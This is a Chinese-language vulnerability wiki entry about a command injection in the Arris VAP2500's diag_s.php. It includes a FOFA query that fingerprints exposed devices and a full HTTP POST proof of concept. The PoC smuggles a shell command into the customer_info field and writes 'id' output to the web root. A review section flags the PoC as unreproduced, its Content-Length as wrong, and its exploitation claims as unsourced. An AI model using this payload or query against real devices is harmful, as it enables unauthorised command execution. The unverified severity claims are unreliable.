---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-3413e9a986e585af328fef1a"
entity_id: "ve-3413e9a986e585af328fef1a"
schema_version: "1"
title: "Arris VAP2500 diag_s 命令注入漏洞"
product: "Arris VAP2500"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无固件版本/鉴权前提"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Arris/Arris%20VAP2500%20diag_s%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
previous_fofa_unverified: "body="
fofa: "body=\"CACHE-CONTROL\" && body=\"/js/cookiecontrol.js\""
---

# Arris VAP2500 diag_s 命令注入漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Arris VAP2500
- 本文讨论：diag_s.php customer_info命令注入
- 版本、权限与配置前提：无固件版本/鉴权前提
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- frontmatter fofa仅body=，正文查询完整
- 宣称在野利用已知、影响面广等无来源支撑
- Content-Length:12与请求体明显不符，报文未放代码块
- 写文件后无验证请求/成功响应，修复仅泛称安全版本
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 未认证可达性、写路径和补丁版本未验证
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

Arris VAP2500 diag_s 命令注入漏洞 diag_s.php处存在命令注入漏洞，攻击者可利用该漏洞进行任意命令注入操作。

# 影响版本

Arris VAP2500

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="CACHE-CONTROL" && body="/js/cookiecontrol.js"

POC/EXP：

```http
POST /diag_s.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 12

action=1&customer_info=;echo `id` > /var/www/123.txt;
```






# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
